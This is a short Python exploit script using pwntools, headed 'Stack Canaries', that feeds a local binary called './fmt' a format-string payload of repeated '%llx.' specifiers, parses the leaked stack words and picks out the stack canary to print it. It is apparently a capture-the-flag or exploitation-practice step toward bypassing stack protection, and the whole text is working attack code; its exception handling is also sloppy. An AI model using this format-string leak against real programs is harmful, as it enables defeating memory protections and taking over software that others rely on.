# Stack Canaries

#!/usr/bin/env python3
from pwn import *
import sys, time, os

context(arch="amd64", os="linux", log_level="DEBUG")
p = process("./fmt")
def leak_canary():
    check = []
    fmt = "%llx."*100
    p.sendline(fmt)

    data = p.recvall(timeout=1).split(b".")
    for i in range(3):
        for i in range(len(data)):
            if str(data[i][-2:].decode()) == "00":
                if len(data[i]) == 16:
                    check.append(i)
    try:
        ind = max(set(check), key=check.count)
        return int(data[ind], 16)
    except ValueError or NoneType:
        log.warning("Could not locate a Stack Canary!")


canary = leak_canary()
log.info("LEAKED STACK CANARY: %s" % hex(canary))
